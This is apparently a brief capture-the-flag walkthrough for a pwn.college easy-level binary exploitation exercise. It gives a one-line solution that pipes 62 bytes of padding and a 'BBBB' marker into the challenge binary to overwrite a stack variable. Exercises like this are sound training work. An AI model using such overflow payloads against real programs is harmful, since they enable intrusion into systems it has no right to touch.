# Stage 03: Precision (Easy) — CTF Walkthrough

## Module Metadata

| Field | Value |
|-------|-------|
| **Module Name** | Pwn.College — Binary Exploitation |
| **Level** | Easy |
| **Estimated Time** | — |
| **Category** | Binary Exploitation / Reversing |
| **Platform** | Linux x86-64 |
| **Binary** | `binary-exploitation-lose-variable-w` |
| **VT Score** | N/A |

---

## Challenge

`/challenge/binary-exploitation-lose-variable-w`. The lose-variable exercise: 62 bytes of `A` padding followed by a 4-byte `BBBB` marker.

## Solution

```bash
python3 -c "print('A' * 62 + 'BBBB', end='')" | /challenge/binary-exploitation-lose-variable-w
```
